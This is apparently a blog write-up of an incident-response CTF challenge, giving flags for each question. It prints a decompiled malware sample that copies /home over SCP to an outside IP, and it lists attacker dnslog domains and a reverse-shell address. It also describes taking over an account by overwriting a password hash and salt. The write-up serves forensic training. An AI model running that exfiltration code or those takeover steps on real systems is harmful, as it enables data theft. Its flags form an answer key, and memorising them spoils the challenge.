+<p><img src="/p/2025%E5%B8%95%E9%B2%81%E6%9D%AF%E5%BA%94%E6%80%A5%E5%A4%8D%E7%8E%B0/image-20250603145058380.png"
+	width="631"
+	height="81"
+	srcset="/p/2025%E5%B8%95%E9%B2%81%E6%9D%AF%E5%BA%94%E6%80%A5%E5%A4%8D%E7%8E%B0/image-20250603145058380_hu11735875774275329381.png 480w, /p/2025%E5%B8%95%E9%B2%81%E6%9D%AF%E5%BA%94%E6%80%A5%E5%A4%8D%E7%8E%B0/image-20250603145058380_hu11351022295057325810.png 1024w"
+	loading="lazy"
+	
+		alt="image-20250603145058380"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="779"
+		data-flex-basis="1869px"
+	
+></p>
+<p>找到三个</p>
+<p>cat第三个，可以查看到执行的命令记录</p>
+<p><img src="/p/2025%E5%B8%95%E9%B2%81%E6%9D%AF%E5%BA%94%E6%80%A5%E5%A4%8D%E7%8E%B0/image-20250603150416444.png"
+	width="1600"
+	height="294"
+	srcset="/p/2025%E5%B8%95%E9%B2%81%E6%9D%AF%E5%BA%94%E6%80%A5%E5%A4%8D%E7%8E%B0/image-20250603150416444_hu14329874230817006582.png 480w, /p/2025%E5%B8%95%E9%B2%81%E6%9D%AF%E5%BA%94%E6%80%A5%E5%A4%8D%E7%8E%B0/image-20250603150416444_hu6079073988598172817.png 1024w"
+	loading="lazy"
+	
+		alt="image-20250603150416444"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="544"
+		data-flex-basis="1306px"
+	
+></p>
+<p>这里有个cat flag命令</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">palu{Server_Parloo_2025}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="应急响应2-21">应急响应2-21
+</h3><p>提交获取敏感内容IP的第一次执行命令时间作为flag进行提交。flag格式为palu{xxxx-xx-xx:xx:xx:xx}</p>
+<p>翻到最上面就行了</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">palu{2025-05-04:15:30:38}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="应急响应2-22">应急响应2-22
+</h3><p>提交攻击者使用的恶意ip和端口flag格式为palu{xx.xx.xx.xx:xxxx}</p>
+<p>上面catflag完后执行了反弹shell命令</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">palu{10.12.12.13:9999}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="应急响应2-23">应急响应2-23
+</h3><p>提交重要数据的明文内容作为flag提交</p>
+<p>前面palu03机子的桌面就有一个密文，直接提交不对看来是被加密了</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">c3alc3c13e326020c3919093e1260525045e
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>这个需要爆破</p>
+<p>首先先去前面那个git仓库登入hack的账号</p>
+<p>但是密码未知，但是mysql服务启动了我们可以去查询,navicat连接</p>
+<p><img src="/p/2025%E5%B8%95%E9%B2%81%E6%9D%AF%E5%BA%94%E6%80%A5%E5%A4%8D%E7%8E%B0/image-20250603184816185.png"
+	width="1649"
+	height="525"
+	srcset="/p/2025%E5%B8%95%E9%B2%81%E6%9D%AF%E5%BA%94%E6%80%A5%E5%A4%8D%E7%8E%B0/image-20250603184816185_hu18279479680226031238.png 480w, /p/2025%E5%B8%95%E9%B2%81%E6%9D%AF%E5%BA%94%E6%80%A5%E5%A4%8D%E7%8E%B0/image-20250603184816185_hu4096569916353825976.png 1024w"
+	loading="lazy"
+	
+		alt="image-20250603184816185"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="314"
+		data-flex-basis="753px"
+	
+></p>
+<p>user表里面有hack的密码,由于hash不知道，我们新建一个账号替换他的密码</p>
+<p>不仅要改密码还要改salt值</p>
+<p>登入进来有个encode.py</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">custom_encrypt</span><span class="p">(</span><span class="n">text</span><span class="p">,</span> <span class="n">key</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">encrypted</span> <span class="o">=</span> <span class="p">[]</span>
+</span></span><span class="line"><span class="cl">    <span class="n">key_bytes</span> <span class="o">=</span> <span class="p">[</span><span class="nb">ord</span><span class="p">(</span><span class="n">c</span><span class="p">)</span> <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">key</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span><span class="p">,</span> <span class="n">char</span> <span class="ow">in</span> <span class="nb">enumerate</span><span class="p">(</span><span class="n">text</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="n">shifted</span> <span class="o">=</span> <span class="nb">ord</span><span class="p">(</span><span class="n">char</span><span class="p">)</span> <span class="o">+</span> <span class="p">(</span><span class="n">i</span> <span class="o">%</span> <span class="mi">5</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">xor_key</span> <span class="o">=</span> <span class="n">key_bytes</span><span class="p">[</span><span class="n">i</span> <span class="o">%</span> <span class="nb">len</span><span class="p">(</span><span class="n">key_bytes</span><span class="p">)]</span>
+</span></span><span class="line"><span class="cl">        <span class="n">xored</span> <span class="o">=</span> <span class="n">shifted</span> <span class="o">^</span> <span class="n">xor_key</span>
+</span></span><span class="line"><span class="cl">        <span class="n">substituted</span> <span class="o">=</span> <span class="p">((</span><span class="n">xored</span> <span class="o">&amp;</span> <span class="mh">0x0F</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="mi">4</span><span class="p">)</span> <span class="o">|</span> <span class="p">((</span><span class="n">xored</span> <span class="o">&amp;</span> <span class="mh">0xF0</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">4</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">encrypted</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">substituted</span><span class="si">:</span><span class="s2">02x</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="s2">&#34;&#34;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">encrypted</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>需要key,这里由于flag格式是palu{开头的，所以爆破密钥，最后推出key为<code>MySecretKey</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">custom_decrypt</span><span class="p">(</span><span class="n">ciphertext</span><span class="p">,</span> <span class="n">key</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">decrypted</span> <span class="o">=</span> <span class="p">[]</span>
+</span></span><span class="line"><span class="cl">    <span class="n">key_bytes</span> <span class="o">=</span> <span class="p">[</span><span class="nb">ord</span><span class="p">(</span><span class="n">c</span><span class="p">)</span> <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">key</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">ciphertext</span><span class="p">),</span> <span class="mi">2</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="n">hex_byte</span> <span class="o">=</span> <span class="n">ciphertext</span><span class="p">[</span><span class="n">i</span><span class="p">:</span><span class="n">i</span><span class="o">+</span><span class="mi">2</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">        <span class="n">substituted</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">hex_byte</span><span class="p">,</span> <span class="mi">16</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">xored</span> <span class="o">=</span> <span class="p">((</span><span class="n">substituted</span> <span class="o">&amp;</span> <span class="mh">0x0F</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="mi">4</span><span class="p">)</span> <span class="o">|</span> <span class="p">((</span><span class="n">substituted</span> <span class="o">&amp;</span> <span class="mh">0xF0</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">4</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        
+</span></span><span class="line"><span class="cl">        <span class="n">xor_key</span> <span class="o">=</span> <span class="n">key_bytes</span><span class="p">[(</span><span class="n">i</span> <span class="o">//</span> <span class="mi">2</span><span class="p">)</span> <span class="o">%</span> <span class="nb">len</span><span class="p">(</span><span class="n">key_bytes</span><span class="p">)]</span>
+</span></span><span class="line"><span class="cl">        <span class="n">shifted</span> <span class="o">=</span> <span class="n">xored</span> <span class="o">^</span> <span class="n">xor_key</span>
+</span></span><span class="line"><span class="cl">        <span class="n">original_char_code</span> <span class="o">=</span> <span class="n">shifted</span> <span class="o">-</span> <span class="p">((</span><span class="n">i</span> <span class="o">//</span> <span class="mi">2</span><span class="p">)</span> <span class="o">%</span> <span class="mi">5</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">decrypted</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="n">original_char_code</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="s1">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">decrypted</span><span class="p">)</span>    
+</span></span><span class="line"><span class="cl"><span class="n">key</span> <span class="o">=</span> <span class="s2">&#34;MySecretKey&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">ciphertext</span> <span class="o">=</span> <span class="s2">&#34;c3a1c3c13e326020c3919093e1260525045e&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">plaintext</span> <span class="o">=</span> <span class="n">custom_decrypt</span><span class="p">(</span><span class="n">ciphertext</span><span class="p">,</span> <span class="n">key</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">plaintext</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/2025%E5%B8%95%E9%B2%81%E6%9D%AF%E5%BA%94%E6%80%A5%E5%A4%8D%E7%8E%B0/image-20250603190531990.png"
+	width="1018"
+	height="71"
+	srcset="/p/2025%E5%B8%95%E9%B2%81%E6%9D%AF%E5%BA%94%E6%80%A5%E5%A4%8D%E7%8E%B0/image-20250603190531990_hu16735179006310608566.png 480w, /p/2025%E5%B8%95%E9%B2%81%E6%9D%AF%E5%BA%94%E6%80%A5%E5%A4%8D%E7%8E%B0/image-20250603190531990_hu16480198299199143455.png 1024w"
+	loading="lazy"
+	
+		alt="image-20250603190531990"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="1433"
+		data-flex-basis="3441px"
+	
+></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">palu{Password-000}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="应急响应2-24">应急响应2-24
+</h3><p>提交恶意维权软件的名称作为flag进行提交</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">palu{svhost}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="应急响应2-25">应急响应2-25
+</h3><p>提交恶意程序的外联地址</p>
+<p>由于定位了黑客攻击时间段，我们用everthing查看5月4日到5月14日的东西</p>
+<p>发现ipconfig.exe</p>
+<p>看图标是python写的，我们直接python反编译一下</p>
+<p>先把exe反编译成pyc文件</p>
+<p><img src="/p/2025%E5%B8%95%E9%B2%81%E6%9D%AF%E5%BA%94%E6%80%A5%E5%A4%8D%E7%8E%B0/image-20250603192130522.png"
+	width="1325"
+	height="410"
+	srcset="/p/2025%E5%B8%95%E9%B2%81%E6%9D%AF%E5%BA%94%E6%80%A5%E5%A4%8D%E7%8E%B0/image-20250603192130522_hu10829100737597013452.png 480w, /p/2025%E5%B8%95%E9%B2%81%E6%9D%AF%E5%BA%94%E6%80%A5%E5%A4%8D%E7%8E%B0/image-20250603192130522_hu7092217484410622544.png 1024w"
+	loading="lazy"
+	
+		alt="image-20250603192130522"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="323"
+		data-flex-basis="775px"
+	
+></p>
+<p>然后把pyc反编译为py文件</p>
+<p><a class="link" href="https://tool.lu/pyc/"  target="_blank" rel="noopener"
+    >python反编译 - 在线工具</a></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/env python</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># visit https://tool.lu/pyc/ for more information</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># Version: Python 3.8</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">os</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">paramiko</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">scp</span> <span class="kn">import</span> <span class="n">SCPClient</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pathlib</span> <span class="kn">import</span> <span class="n">Path</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">create_ssh_client</span><span class="p">(</span><span class="n">server</span><span class="p">,</span> <span class="n">port</span><span class="p">,</span> <span class="n">username</span><span class="p">,</span> <span class="n">password</span><span class="p">,</span> <span class="n">key_path</span> <span class="o">=</span> <span class="p">(</span><span class="kc">None</span><span class="p">,</span> <span class="kc">None</span><span class="p">)):</span>
+</span></span><span class="line"><span class="cl">    <span class="s1">&#39;&#39;&#39;
+</span></span></span><span class="line"><span class="cl"><span class="s1">    创建SSH客户端连接
+</span></span></span><span class="line"><span class="cl"><span class="s1">    &#39;&#39;&#39;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">client</span> <span class="o">=</span> <span class="n">paramiko</span><span class="o">.</span><span class="n">SSHClient</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="n">client</span><span class="o">.</span><span class="n">set_missing_host_key_policy</span><span class="p">(</span><span class="n">paramiko</span><span class="o">.</span><span class="n">AutoAddPolicy</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># WARNING: Decompyle incomplete</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">transfer_directory</span><span class="p">(</span><span class="n">scp</span><span class="p">,</span> <span class="n">local_path</span><span class="p">,</span> <span class="n">remote_path</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="s1">&#39;&#39;&#39;
+</span></span></span><span class="line"><span class="cl"><span class="s1">    递归传输目录
+</span></span></span><span class="line"><span class="cl"><span class="s1">    &#39;&#39;&#39;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">item</span> <span class="ow">in</span> <span class="n">os</span><span class="o">.</span><span class="n">listdir</span><span class="p">(</span><span class="n">local_path</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="n">local_item</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">local_path</span><span class="p">,</span> <span class="n">item</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">islink</span><span class="p">(</span><span class="n">local_item</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;&#39;&#39;跳过符号链接: </span><span class="si">{</span><span class="n">local_item</span><span class="si">}</span><span class="s1">&#39;&#39;&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="k">continue</span>
+</span></span><span class="line"><span class="cl">        <span class="n">remote_item</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">remote_path</span><span class="p">,</span> <span class="n">item</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">isdir</span><span class="p">(</span><span class="n">local_item</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">            
+</span></span><span class="line"><span class="cl">            <span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                <span class="n">scp</span><span class="o">.</span><span class="n">mkdir</span><span class="p">(</span><span class="n">remote_item</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="k">finally</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                <span class="k">pass</span>
+</span></span><span class="line"><span class="cl">            <span class="n">transfer_directory</span><span class="p">(</span><span class="n">scp</span><span class="p">,</span> <span class="n">local_item</span><span class="p">,</span> <span class="n">remote_item</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="k">continue</span>
+</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;&#39;&#39;传输文件中: </span><span class="si">{</span><span class="n">local_item</span><span class="si">}</span><span class="s1">&#39;&#39;&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="n">scp</span><span class="o">.</span><span class="n">put</span><span class="p">(</span><span class="n">local_item</span><span class="p">,</span> <span class="n">remote_item</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="k">continue</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="kc">None</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="n">ssh_config</span> <span class="o">=</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="s1">&#39;server&#39;</span><span class="p">:</span> <span class="s1">&#39;88.173.90.103&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="s1">&#39;port&#39;</span><span class="p">:</span> <span class="mi">22</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="s1">&#39;username&#39;</span><span class="p">:</span> <span class="s1">&#39;ubuntu&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="s1">&#39;password&#39;</span><span class="p">:</span> <span class="s1">&#39;OOWPWPWADADA&#39;</span> <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="n">local_home</span> <span class="o">=</span> <span class="s1">&#39;/home&#39;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">remote_base</span> <span class="o">=</span> <span class="s1">&#39;/home/ubuntu/backup_home&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># WARNING: Decompyle incomplete</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">main</span><span class="p">()</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">palu{88.173.90.103}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="应急响应2-26">应急响应2-26
+</h3><p>提交攻击这使用的恶意dnslog域名作为flag进行提交</p>
+<p>这个在之前的cat flag那题下面就有,好几个</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">https://zdcg1o9v.requestrepo.com/
+</span></span><span class="line"><span class="cl">w0tynrqr.requestrepo.com
+</span></span><span class="line"><span class="cl">np85qqde.requestrepo.com
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/2025%E5%B8%95%E9%B2%81%E6%9D%AF%E5%BA%94%E6%80%A5%E5%A4%8D%E7%8E%B0/image-20250603192802986.png"
+	width="1676"
+	height="469"
+	srcset="/p/2025%E5%B8%95%E9%B2%81%E6%9D%AF%E5%BA%94%E6%80%A5%E5%A4%8D%E7%8E%B0/image-20250603192802986_hu2467816185745423891.png 480w, /p/2025%E5%B8%95%E9%B2%81%E6%9D%AF%E5%BA%94%E6%80%A5%E5%A4%8D%E7%8E%B0/image-20250603192802986_hu2645620405527550862.png 1024w"
+	loading="lazy"
+	
+		alt="image-20250603192802986"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="357"
+		data-flex-basis="857px"
+	
+></p>
+<p>但是可以看到当最后一个dns域名执行whoami命令之后黑客反弹shell成功了</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">palu{np85qqde.requestrepo.com}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="应急响应2-27">应急响应2-27
+</h3><p>提交寻找反序列化漏洞的端口作为flag进行提交</p>
+<p>前面fscan扫到高危漏洞9999端口</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">palu{9999}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="应急响应2-28">应急响应2-28
+</h3><p>提交web服务泄露的密钥作为flag进行提交</p>
+<p>前面这个fscan并没有扫出反序列化漏洞,换afrog扫出shiro和heapdump泄露</p>
+<p><img src="/p/2025%E5%B8%95%E9%B2%81%E6%9D%AF%E5%BA%94%E6%80%A5%E5%A4%8D%E7%8E%B0/image-20250603194927287.png"
+	width="1192"
+	height="290"
+	srcset="/p/2025%E5%B8%95%E9%B2%81%E6%9D%AF%E5%BA%94%E6%80%A5%E5%A4%8D%E7%8E%B0/image-20250603194927287_hu15232864128155139880.png 480w, /p/2025%E5%B8%95%E9%B2%81%E6%9D%AF%E5%BA%94%E6%80%A5%E5%A4%8D%E7%8E%B0/image-20250603194927287_hu6114946630008677005.png 1024w"
+	loading="lazy"
+	
+		alt="image-20250603194927287"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="411"
+		data-flex-basis="986px"
+	
+></p>
+<p>先把heapdump下下来</p>
+<p>然后用jdumpspider分析文件中的敏感信息</p>
+<p><img src="/p/2025%E5%B8%95%E9%B2%81%E6%9D%AF%E5%BA%94%E6%80%A5%E5%A4%8D%E7%8E%B0/image-20250603200327810.png"
+	width="1483"
+	height="762"
+	srcset="/p/2025%E5%B8%95%E9%B2%81%E6%9D%AF%E5%BA%94%E6%80%A5%E5%A4%8D%E7%8E%B0/image-20250603200327810_hu11047401569562092635.png 480w, /p/2025%E5%B8%95%E9%B2%81%E6%9D%AF%E5%BA%94%E6%80%A5%E5%A4%8D%E7%8E%B0/image-20250603200327810_hu17599650864065243758.png 1024w"
+	loading="lazy"
+	
+		alt="image-20250603200327810"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="194"
+		data-flex-basis="467px"
+	
+></p>
+<p>这里就跑出来key了</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">palu{QZYysgMYhG6/CzIJlVpR2g==}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="应急响应2-29">应急响应2-29
+</h3><p>提交攻击者开始攻击的时间作为flag进行提交。flag各式为palu{xxxx/xx/xx:xx:xx:xx}</p>
+<p>进雷池waf查看</p>
+<p><img src="/p/2025%E5%B8%95%E9%B2%81%E6%9D%AF%E5%BA%94%E6%80%A5%E5%A4%8D%E7%8E%B0/image-20250603203700768.png"
+	width="1062"
+	height="93"
+	srcset="/p/2025%E5%B8%95%E9%B2%81%E6%9D%AF%E5%BA%94%E6%80%A5%E5%A4%8D%E7%8E%B0/image-20250603203700768_hu14921873022416211368.png 480w, /p/2025%E5%B8%95%E9%B2%81%E6%9D%AF%E5%BA%94%E6%80%A5%E5%A4%8D%E7%8E%B0/image-20250603203700768_hu4906964438323531968.png 1024w"
+	loading="lazy"
+	
+		alt="image-20250603203700768"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="1141"
+		data-flex-basis="2740px"
+	
+></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">palu{2025/05/13:16:45:19}
+</span></span></code></pre></td></tr></table>
